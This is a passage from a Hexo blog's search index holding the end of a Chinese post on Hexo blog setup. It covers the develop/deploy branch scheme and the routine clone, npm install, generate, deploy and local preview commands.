<span class="attr">repo:</span> <span class="string">git@github.com:JiaweiHawk/jiaweihawk.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">&quot;deploy&quot;</span></span><br></pre></td></tr></table></figure><p>  这里就完成了博客部署的设置，具体的部署操作在下面一起讲解</p><h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><p>  根据最开始所说，仓库中会有两个分支：一个<strong>develop</strong>分支，用于存储博客环境的设置信息；另一个是<strong>deploy</strong>分支，其存储用于部署的博客前端资源。其中在设置github pages或其他服务器时，需要注意一下绑定的仓库分支即可</p><p>  对于更新或拉取博客设置信息，从而快速恢复博客的生成环境，在<strong>working_dir</strong>目录下执行下列命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b develop git@gitee.com:jiaweihawk/jiaweihawk.git blog &amp;&amp; (<span class="built_in">cd</span> blog; npm install)</span><br></pre></td></tr></table></figure><p>  对于有新的博客要推送，或更新已有的博客到远程服务器上，则在<strong>working_dir</strong>目录下执行下列命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo.cmd clean</span><br><span class="line">hexo.cmd generate</span><br><span class="line">hexo.cmd deploy</span><br></pre></td></tr></table></figure><p>  这里最后在特别说明一下：在更新博客到远程服务器之前，可以在本地进行查看，执行如下命令，即可在<strong>http:\/\/localhost:4000</strong>网址进行查看。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo.cmd clean</span><br><span class="line">hexo.cmd generate</span><br><span class="line">hexo.cmd server</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 设置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设置 </tag>
            
            <tag> nodejs </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
